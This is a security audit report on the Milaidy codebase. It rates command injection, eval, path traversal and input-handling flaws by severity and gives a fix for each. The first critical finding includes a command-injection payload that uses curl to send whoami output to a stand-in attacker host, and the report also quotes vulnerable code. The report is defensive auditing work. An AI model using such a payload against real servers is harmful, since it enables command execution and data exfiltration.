# Security Audit Report — Milaidy Repository

**Date:** 2026-02-09
**Scope:** Full codebase review for backdoors, vulnerabilities, and security weaknesses
**Repository:** milaidy v2.0.0-alpha.7

---

## Executive Summary

The Milaidy codebase does **not** contain intentional backdoors. However, the audit identified **2 critical**, **2 high**, **3 medium**, and several low-severity vulnerabilities. The most serious issues involve command injection via unsanitized user input passed to shell execution, and path traversal in skill management endpoints.

**No hardcoded production secrets or credentials were found.** All sensitive values in the repository are clearly test fixtures or placeholders.

---

## Critical Findings

### 1. Command Injection in `/api/skills/:id/open`

- **File:** `src/api/server.ts` lines 2637-2644
- **Severity:** CRITICAL
- **Type:** CWE-78 (OS Command Injection)

**Description:** The `skillId` URL parameter is decoded from user input, joined into a file path, and passed directly into `exec()` wrapped in double quotes. Double quotes do not prevent command substitution via backticks or `$()`, nor do they prevent semicolons or other shell metacharacters from breaking out.

```typescript
const skillId = decodeURIComponent(pathname.split("/")[3]);
// ... skillPath derived from skillId ...
const cmd = process.platform === "darwin"
  ? `open "${skillPath}"`
  : `xdg-open "${skillPath}"`;
exec(cmd, ...);
```

**Attack vector:** A crafted `skillId` like `test$(curl attacker.com/exfil?d=$(whoami))` would execute arbitrary commands.

**Note:** The `src/utils/exec-safety.ts` module exists with proper validation (`isSafeExecutableValue`) but is **not imported or used** in this endpoint.

**Recommendation:** Replace `exec()` with `execFile()` or `spawn()` using argument arrays. Alternatively, validate `skillId` against a strict allowlist regex (e.g., `^[a-z0-9-]+$`).

---

### 2. Arbitrary JavaScript Execution via Canvas Plugin `eval()`

- **Files:**
  - `apps/app/electron/src/native/canvas.ts` line 151
  - `apps/app/plugins/canvas/src/web.ts` lines 720-741
  - Android: `apps/app/plugins/canvas/android/.../CanvasPlugin.kt` line 1469
  - iOS: `apps/app/plugins/canvas/ios/.../CanvasPlugin.swift` line 877
- **Severity:** CRITICAL
- **Type:** CWE-94 (Code Injection)

**Description:** The canvas plugin exposes an `eval()` method across all platforms (Electron, Web, Android, iOS) that executes arbitrary JavaScript in web views. In Electron, this calls `webContents.executeJavaScript()` with full application context.

```typescript
async eval(options: { windowId: string; script: string }): Promise<{ result: unknown }> {
  const win = this.getWindow(options.windowId);
  const result = await win.webContents.executeJavaScript(options.script, true);
  return { result };
}
```

**Note:** This appears to be intentional functionality for the canvas/scripting feature. However, if any other part of the application passes untrusted data to this method, it becomes a full remote code execution vector.

**Recommendation:** Implement strict access controls, input validation, and consider a sandboxed execution context (e.g., isolated WebContents with `contextIsolation: true` and restricted preload).

---

## High Findings

### 3. Path Traversal in Skill Management Endpoints

- **File:** `src/api/server.ts` lines 2579-2665
- **Severity:** HIGH
- **Type:** CWE-22 (Path Traversal)

**Affected endpoints:**
- `POST /api/skills/:id/open`
- `DELETE /api/skills/:id`

**Description:** The `skillId` parameter is URL-decoded and used directly in `path.join()` calls without path traversal validation. An attacker can use `../` sequences to escape the intended `skills/` directory.

```typescript
const skillId = decodeURIComponent(pathname.split("/")[3]);
const wsDir = path.join(workspaceDir, "skills", skillId);
// DELETE endpoint: fs.rmSync(wsDir, { recursive: true, force: true });
```

**Partial mitigation:** The code checks for `SKILL.md` existence before proceeding, but this is not a reliable defense.

**Contrast:** The `POST /api/skills/create` endpoint properly sanitizes the skill name with a strict regex (`/[^a-z0-9-]/g`). This same pattern should be applied to skill ID lookups.

**Recommendation:** Validate `skillId` against `^[a-z0-9-]+$` or resolve the path and verify it stays within the intended directory using `path.resolve()` and a prefix check.

---

### 4. Unsafe JSON.parse Without Error Handling

- **Files:**
  - `src/api/cloud-routes.ts` line 160
  - `src/api/database.ts` lines 322, 391, 639, 680, 733
- **Severity:** HIGH
- **Type:** CWE-20 (Improper Input Validation)

**Description:** Multiple API endpoints call `JSON.parse()` on request bodies without try/catch. Malformed JSON will throw an uncaught exception, crashing the request handler (and potentially the server if there's no global error boundary).

```typescript
// database.ts — PUT /api/database/config
const body = JSON.parse(await readBody(req)) as DatabaseConfig;
```

**Contrast:** The main `server.ts` properly wraps JSON.parse in try/catch (lines 853-863).

**Recommendation:** Wrap all `JSON.parse()` calls in try/catch blocks and return HTTP 400 on parse failure.

---

## Medium Findings

### 5. Dynamic Function Creation in Electron Agent

- **File:** `apps/app/electron/src/native/agent.ts` lines 27-29
- **Severity:** MEDIUM

```typescript
const dynamicImport = new Function("specifier", "return import(specifier)");
```

Used to create a dynamic ESM import. Input is limited to internal module names, but the pattern is inherently dangerous.

### 6. Shell Commands in Development Scripts

- **File:** `scripts/dev-ui.mjs` lines 73, 79
- **Severity:** MEDIUM (dev-only)

Template literal interpolation in `execSync()` calls. Port values are hardcoded constants, so exploitation risk is minimal.

### 7. Shell Execution with `shell: true` in Self-Updater

- **File:** `src/services/self-updater.ts` line 136
- **Severity:** MEDIUM

`spawn()` is called with `shell: true`. Commands are from a hardcoded whitelist (`npm`, `bun`, `pnpm`, `sudo`, `sh`, `flatpak`), limiting risk.

---

## Low Findings

### 8. `which` Command with Variable Input (Mitigated)
- **File:** `src/services/self-updater.ts` line 34 — Only called with hardcoded `"milaidy"` string.

### 9. WebSocket to Localhost (Chrome Extension)
- **File:** `apps/chrome-extension/background.js` line 59 — Connects only to `127.0.0.1`.

### 10. Auth Endpoint Information Disclosure
- **File:** `src/api/server.ts` — `/api/auth/status` reveals pairing state without authentication.

---

## Positive Security Practices

The codebase demonstrates several strong security practices:

| Practice | Location |
|----------|----------|
| Timing-safe token comparison | `server.ts` — `crypto.timingSafeEqual()` |
| Rate limiting on pairing attempts | `server.ts` lines 1238-1248 |
| Request body size limits | `server.ts` — MAX_BODY_BYTES = 1MB |
| CORS restricted to localhost by default | `server.ts` lines 1148-1194 |
| Prototype pollution protection | `config-paths.ts` — blocks `__proto__`, `prototype`, `constructor` |
| Input validation for skill creation | `server.ts` — strict regex sanitization |
| Plugin installer input validation | `plugin-installer.ts` — regex for package names, versions, git URLs |
| Path traversal check in plugin installer | `plugin-installer.ts` — `isWithinPluginsDir()` |
| Non-root Docker containers | `deploy/Dockerfile` — `USER node` |
| Exec safety utility available | `src/utils/exec-safety.ts` — `isSafeExecutableValue()` |
| No hardcoded production secrets | All secrets are test fixtures or env-var references |
| Proper .gitignore for .env files | `.gitignore` excludes `.env` |

---

## Credential Scan Results

| Category | Finding |
|----------|---------|
| API Keys | Only test values (`sk-test-123`, `sk-ant-test`, etc.) |
| Private Keys | Only Hardhat Account #0 (well-known test key) |
| Auth Tokens | Only test tokens (`test-secret-token-abc123`, etc.) |
| .env Files | Not committed; properly gitignored |
| Credential Files | None found |
| CI/CD Secrets | Properly use GitHub Actions secrets mechanism |

---

## Supply Chain Assessment

| Component | Risk | Notes |
|-----------|------|-------|
| `install.sh` — curl pipe to bash for nvm/fnm | MEDIUM | Industry standard, trusted upstream |
| `install.sh` — NodeSource setup script | MEDIUM | Official Node.js distribution |
| `Dockerfile` — Bun installer | LOW | Container-scoped |
| `package.json` prepare script | LOW | Only sets git hooks path |
| Dependencies | LOW | No typosquatting detected; pinned via lockfile |

---

## Recommendations Summary

### Immediate (Critical)
1. Replace `exec()` with `execFile()`/`spawn()` in `POST /api/skills/:id/open`
2. Validate `skillId` parameter against strict regex `^[a-z0-9][a-z0-9-]*$`
3. Add access controls to the Canvas `eval()` functionality

### Short-term (High)
4. Wrap all `JSON.parse()` calls in `database.ts` and `cloud-routes.ts` with try/catch
5. Apply the existing `exec-safety.ts` validation where shell commands are constructed
6. Add path normalization checks (`path.resolve()` + prefix validation) to all skill endpoints

### Long-term (Enhancement)
7. Add pre-commit secret scanning (e.g., `detect-secrets` or `truffleHog`)
8. Consider checksum verification for downloaded installer scripts
9. Add security headers (CSP, X-Frame-Options, X-Content-Type-Options) to HTTP responses
10. Conduct periodic automated dependency vulnerability scanning
